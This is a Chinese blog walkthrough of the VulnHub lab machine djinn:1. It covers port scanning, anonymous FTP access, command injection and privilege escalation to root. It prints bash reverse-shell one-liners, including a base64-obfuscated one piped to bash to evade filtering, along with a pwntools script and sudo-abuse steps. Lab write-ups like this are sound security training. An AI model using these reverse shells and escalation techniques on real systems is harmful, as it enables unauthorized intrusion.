> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/lPp2SpIZTf3mb680nabz8A)

![](https://mmbiz.qpic.cn/mmbiz_png/90uI9kWZONf3Vtrusjqsd1GiaM6KOIZBsXy5uveXdick8Xu5bT5SkWAjm8rXMUf4iaaQe0Xvz8kLg8kWGZzTpydxw/640?wx_fmt=png)

下载地址

https://www.vulnhub.com/entry/djinn-1,397/

环境搭建  

VirtualBox

靶机 Hack djinn:1 : walkthrough：192.168.56.104

信息收集

存活 IP 扫描（py 脚本扫描）

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyN0pFBvHIicBjrTxic0mUsCeLnB8DmX5Idlic5hdCdbF7KFTibztC3noJtibzdgDTXWjJeKh2cnWVXtkYw/640?wx_fmt=png)

发现靶机 IP 为 192.168.56.104

端口扫描（Nmap）

```
nmap -sS -sV -T5 -A -p- 192.168.56.104
```

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyN0pFBvHIicBjrTxic0mUsCeLIvn1s7AohXnNNEECxLzWLFCFxYialrVmicttAPkoSfANo8qia0F1rKYEQ/640?wx_fmt=png)

发现 21，1337，7331 端口开放，22 端口过滤状态  

21 端口

ftp 命令大全：http://imhuchao.com/323.html

匿名登录常用的账号密码

```
anonymous/空
主机的IP地址/空
自己的e_mail地址/空
节点自的IP地址/空
admin/空
administrator/空
```

使用 anoymous / 空，成功登录  

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyN0pFBvHIicBjrTxic0mUsCeLujib0iaUpVrYW0o8mVLMumtniaCIj482CafcTjk07eMdyJx0XWYXce1NQ/640?wx_fmt=png)

mget *.* 下载当前目录下的所有文件，本地进行查看

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyN0pFBvHIicBjrTxic0mUsCeLeWJBdibmuUIUIl4nH1OVJB5E5eaIiaficvYVCdrgTFh0NzgDD7wfDYuew/640?wx_fmt=png)

匿名账户登录 ftp 下载并查看三个 txt

creas.txt, 一组用户名密码：nitu:81299

game.txt, 提示在 1337 端口有个游戏

message.txt，要去度假，叫 nitish81299 照顾好工作

1337 端口

使用浏览器访问了一下，无法访问

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyN0pFBvHIicBjrTxic0mUsCeLmH2JyXDiaicufHK2rS4GEdGKQ3dPtTDIsmS1FCYKcMbIODcAnmicibDNRw/640?wx_fmt=png)

telnet 访问

做一些加减乘除的运算，还必须得做完 1000 次，需要一个脚本，盘它

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyN0pFBvHIicBjrTxic0mUsCeLyUicyqpC0yJHCksvUBuxo3dcoxiaoxmEG2J4gkc2uXUsWMSGRcCMEhGQ/640?wx_fmt=png)

python 脚本

```
from pwn import *

c = remote('192.168.56.104',1337)

c.recvuntil("\n\n", drop=True)

for i in range(1001):

    c.recvuntil("(", drop=True)
    int1 = c.recvuntil(",", drop=True)

    c.recvuntil("'", drop=True)
    mathsym = c.recvuntil("'", drop=True)

    c.recvuntil(", ", drop=True)
    int2 = c.recvuntil(")", drop=True)

    equation = int1+mathsym+int2
    print(str(i)+"th answer= "+str(equation))

    c.sendlineafter('>',equation)

c.interactive()
```

算出来的结果 1356、6784、3409，看不出来有啥用处  

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyN0pFBvHIicBjrTxic0mUsCeLyY3vibNH21SaFDbMBgJbX5FKjaHRvDR3pFicvPRnicnsiaRO4dkn7PqARQ/640?wx_fmt=png)

7331 端口  

nmap 扫描之后发现`7331`端口是 HTTP 服务，界面如下

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyN0pFBvHIicBjrTxic0mUsCeLX62c3Dsf07FjdAAhgvFyYwsCicNrdc5sIn5MblWC1OEj22vmUYnjRbg/640?wx_fmt=png)

对它进行目录扫描（webdirscan）  

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyN0pFBvHIicBjrTxic0mUsCeLFsicqso19lHzyRPdkwLhia2O9kzEMBRrSSAPa7csByN0nKmuIK1IkicPg/640?wx_fmt=png)

发现有两个目录 wish 和 genie 对其进行查看

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyN0pFBvHIicBjrTxic0mUsCeL7xMJickicG61V5FiaCRics5FWTb3UFJe8a6H8wr9LQooh0zFtaY65UpRSA/640?wx_fmt=png)

可能存在系统命令执行漏洞，经过测试，输入 id，成功返回，存在系统命令执行漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyN0pFBvHIicBjrTxic0mUsCeLh0xQGnwSF2VUDAmmQNkcokqcswiagyFtOsOxLAskRjHw0RgjXAcyzVw/640?wx_fmt=png)

漏洞利用

利用系统命令执行漏洞反弹 shell

Bash 反弹，一直反弹不出来

```
bash -i >& /dev/tcp/192.168.56.104/1234 0>&1
```

猜测是过滤了某些字符

Bypass 一些命令注入限制的姿势

https://xz.aliyun.com/t/3918

https://github.com/swisskyrepo/PayloadsAllTheThings

经过测试，base64 编码就可绕过  

base64 在线编码，解码  

https://www.bt.cn/tools/encrybase.html

nc 监听 1234 端口  

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyN0pFBvHIicBjrTxic0mUsCeLmU0FsADB9mAwxZ3dB1B2dfzZrpYu8AqwWY9iciahjBXrTjZgda5clVdA/640?wx_fmt=png)

执行如下命令：  

```
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEwMi8xMjM0IDA+JjE=| base64 -d|bash
```

成功反弹 shell，权限是 www-data  

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyN0pFBvHIicBjrTxic0mUsCeL8YuG9nyxX3aQ2kD1qPGBc4eYSFlcaTWYKfjpCO1yNssuCem0WJ47Og/640?wx_fmt=png)

获取 shell 之后要做的第一件事是获取一个 tty，不然有些命令是无法执行的

python 获取 tty

```
python -c 'import pty;pty.spawn("/bin/bash")'  # 有些没有安装Python2，所以需要换成python3 -c
```

查看 etc/passwd 发现有两个用户 sam 和 nitish

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyN0pFBvHIicBjrTxic0mUsCeLAv5EBX1hYMqU5x7thzsYvyz9WEDfBdQZDeicFC5q7aFv9tZ5TSiabq0A/640?wx_fmt=png)在 / home/nitish 目录下找到 user.txt 文件，查看没有权限，无法查看，需要提权  

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyN0pFBvHIicBjrTxic0mUsCeL8v6oEIxSq8EszRLhuIdPicLaanAIyVKYBORficVOUpo5DEJQ5dle4KhA/640?wx_fmt=png)

提权

提权（nitish）

在 opt/80 目录下查看所有文件，发现有几个 py 文件，查看 app.py 文件，发现过滤 cmd 的方法和一个文件

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyN0pFBvHIicBjrTxic0mUsCeL2wFkxvp1r8aAg0ojAxTQQrGcIypnfn3szjO7YiaIz5HwSZmq3aC9Sgg/640?wx_fmt=png)

进行访问，发现是 nitish 的账号和密码文件

/home/nitish/.dev/creds.txt

发现 nitish 的账号密码

账号 / 密码：nitish/p4ssw0rdStr3r0n9

利用 su 进行提权，输入账号，密码得到 nitish 权限

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyN0pFBvHIicBjrTxic0mUsCeLuicNFPYqCSzNCzoUTyib0D44kp65BzSSgXul2iahagsaF725eDib3ic9IRw/640?wx_fmt=png)

查看 user.txt 得到第一个 flag

提权（root）

查找 sudo 权限命令：sudo -l  

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyN0pFBvHIicBjrTxic0mUsCeLeaFXbqFyjLS0Ip4K0FJdKMPZeWUvmlGjAfOx6Rj9uvRHFr4ibEKBYRA/640?wx_fmt=png)

sudo -u sam /usr/bin/genie -h 查看下使用说明，发现可以通过这个可执行文件得到一个 shell，应该输入什么样的参数才能获得`sam`用户的 shell

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyN0pFBvHIicBjrTxic0mUsCeLjic5RzSoiaYS7oKsNOH8FZx7647N4tdjzR2jTNbrb2SCv9mluKYqnLGA/640?wx_fmt=png)

man /usr/bin/genie 查看一下使用帮助

man 是 manual 的缩写，man 命令用来提供在线帮助，通过 man 命令可以查看 Linux 中的命令帮助、配置文件帮助、编程帮助等信息。  

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyN0pFBvHIicBjrTxic0mUsCeLeEgurSYWtTDgFicqYUFC69mYQtxJpFdoCiblulK72yuNs9VKDWBdcpMw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyN0pFBvHIicBjrTxic0mUsCeLsozKxy5slwD31icqazibawy0mxjJNycfYK6zNkmpzgsThRfFexibtun6w/640?wx_fmt=png)

genie 可以完成你所有的愿望，甚至可以提升你的权限

```
执行了sudo -u sam /usr/bin/genie -p"/bin/sh"，没有得到sam的shell
执行了sudo -u sam /usr/bin/genie -cmd whoami得到了sam权限
```

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyN0pFBvHIicBjrTxic0mUsCeL2IMWgQAld20HbHtVrvloMCetY8zNREMiawvoZ6WCVxS8CbVlyeQcxrA/640?wx_fmt=png)

提权到了 sam 用户，再次执行 sudo -l 得到如下内容

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyN0pFBvHIicBjrTxic0mUsCeLPPGrnDbaPmvmic71rm3RavDmjqiaRYh6UIImEENA0YZrwaXo0w1xZHQQ/640?wx_fmt=png)

执行 sudo -u root /root/lago 出现一个选择题，无论我们输入什么都不对

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyN0pFBvHIicBjrTxic0mUsCeLfKib0phUPFhPDWpgCZcpSTRUb7iaef4LscphOLzSiaymleYibat9hWbBtw/640?wx_fmt=png)

读取文件也是没有权限（哎）

使用 find / -writable -type f 2>/dev/null 查找可写文件

发现了一个 / home/sam/.pyc，虽然之前也看到过，但那时候并没有引起我的注意

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyN0pFBvHIicBjrTxic0mUsCeLBhYOW5zcjfSkic7NX1WXSnleLmnt889PictaxhuPtfFfnvWlw9CmcZfg/640?wx_fmt=png)

.pyc 文件进行读取查看

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyN0pFBvHIicBjrTxic0mUsCeLZCZjL5WNcj0ibpwXdu8XfDkaKJlAs0A3jeib75oNIa9pPDnUSB9Es1gQ/640?wx_fmt=png)

整理出里面的内容主要内容如下

```
Working on it!!
Choose a number between1 to 100: sEnter your number:
Better Luck next time
Enter the full of thefile to read: s!User %s is not allowed to read
What do you want to do ?
Be naughty
Guess the number
Read some damn file
Enter your choice:
work your ass off!!
```

这些话你之前是不是都看到过？就是在 / root/lago 这个可执行文件里面看到过。也就是说 / root/lago 的源码是 Python，看 / home/sam/.pyc 里面也有这样的描述

把该文件下载到本地进行反编译

靶机上有 python 环境，在改文件目录下使用 python 开启一个 http 服务，下载到本地

```
python -m SimpleHTTPServer 8000
```

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyN0pFBvHIicBjrTxic0mUsCeLMCvsETle30K1dwtuvkDSf7DcyCIqqExXmxo1fwwJ5gQ5VyTNicEakOg/640?wx_fmt=png)  

python 反编译在线

https://tool.lu/pyc

反编译的代码如下

```
#!/usr/bin/env python
# visit http://tool.lu/pyc/ for more information
from getpass import getuser
from os import system
from random import randint
def naughtyboi():
    print 'Working on it!! '
def guessit():
    num = randint(1, 101)
    #num=1
    print 'Choose a number between 1 to 100: '
    s = input('Enter your number: ')
    if s == num:
        system('/bin/sh')
    else:
        print 'Better Luck next time'
def readfiles():
    user = getuser()
    path = input('Enter the full of the file to read: ')
    print 'User %s is not allowed to read %s' % (user, path)
def options():
    print 'What do you want to do ?'
    print '1 - Be naughty'
    print '2 - Guess the number'
    print '3 - Read some damn files'
    print '4 - Work'
    choice = int(input('Enter your choice: '))
    return choice
def main(op):
    if op == 1:
        naughtyboi()
    elif op == 2:
        guessit()
    elif op == 3:
        readfiles()
    elif op == 4:
        print 'work your ass off!!'
    else:
        print 'Do something better with your life'
if __name__ == '__main__':
    main(options())
```

python input() 漏洞  

Python 2.x 中有两种常用的方法来接收输入：

1、使用输入（）功能：此功能需要您输入的输入值和类型，因为它是在不修改任何类型。

2、使用 raw_input() 函数：该函数将您提供的输入显式转换为字符串类型

```
s1 =raw_input("Enter input to testraw_input() function: ")
printtype(s1)

s2 =raw_input("Enter input to testraw_input() function: ")
printtype(s2)

s3 =raw_input("Enter input to testraw_input() function: ")
printtype(s3)

s4 =input("Enter input to testinput() function: ")
printtype(s4)

s5 =input("Enter input to testinput() function: ")
printtype(s5)

s6 =input("Enter input to testinput() function: ")
printtype(s6)
```

输入

```
你好
[1,2,3]
“再见”
[1,2,3]
```

输出  

```
Enter input totest raw_input() function: <type 'str'>
Enter input totest raw_input() function: <type 'str'>
Enter input totest raw_input() function: <type 'str'>

Enter input totest input () 函数：<type ' int '>
Enter inputtotest input() function: <type ' str '>
Enter input to testinput() function: <type ' list '>
```

可以看到使用 raw_input() 无论输入什么都是 str 字符串类型，input() 输入要想输入” 你好” 必须要用引号不然会报错。也就是说如果 input() 输入一个变量返回也就是变量的值，不是一个”secret_number” 字符串，raw_input() 输入一个变量输出也就是个”secret_number” 字符串，如下代码：  

```
import random
secret_number = random.randint(1,500)
print "pick a number between 1 to 500"
while True:
    res = input("Guess the number:")
#输入secret_number
#print(secret_number)
    #res = raw_input("Guess thenumber: ")
#输入secret_number
#print(secret_number)
if res==secret_number:
        print "You win"
        break
    else:
        print "You lose"
        continue
```

input(secret_number) 会输出 you win  

raw_input(secret_number) 会输出 you lose

输入 2，在输入 num 就提权到了 root 权限啦，得到第二个 flag。  

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyN0pFBvHIicBjrTxic0mUsCeLt0D6AxY7jkj7wDpsMtZBb44xtiaafsf9ejSNrXpusY2Ted8QaCrnSxg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/U4c2kTq6HuwQG75NnIBjuWp1ibAfQr2OjjVC4HZuld2yX2xjGTa1IhjyJgf5eNgJZutaQicG3Mb9002ibxVkN3jQQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/CUXc2qyj8Iribib4N4NztfNAnUD9q9a3tCNZW9UARbtxWPOUyCibeiaVBWOyZ7F1v43GtckuSBE2JbMUSwrKCfQic3Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/8AwyWfE0oxLE6f5DJ77da8NX6LXLyUpXXeNGnEL9NNoWvb9p0O6xuh9cQ3pAg9Nl9kEfCBZhqoZtKFiaf9cdSKg/640?wx_fmt=png)

倏忽温风至，因循小暑来。洋湖有清风，可以消烦暑。城市的浮热，在原上的浓阴下散去。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/g2iaCndRcHVOQXmcQ8I4dOlY2sqaat6zyEnsofgOqwON9qvY3K3gG1iaUf1ne0AKZAYMo8e2fxY66RWfxiavQLGOQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/tnNTe6QOaYx4HLiasWDSSibkvBwkySahn1jUGyrqSWWsCrd8WeibGicCbaDB9b5K4cTlaCxcmzv2uyEWNrQke47Vag/640?wx_fmt=png)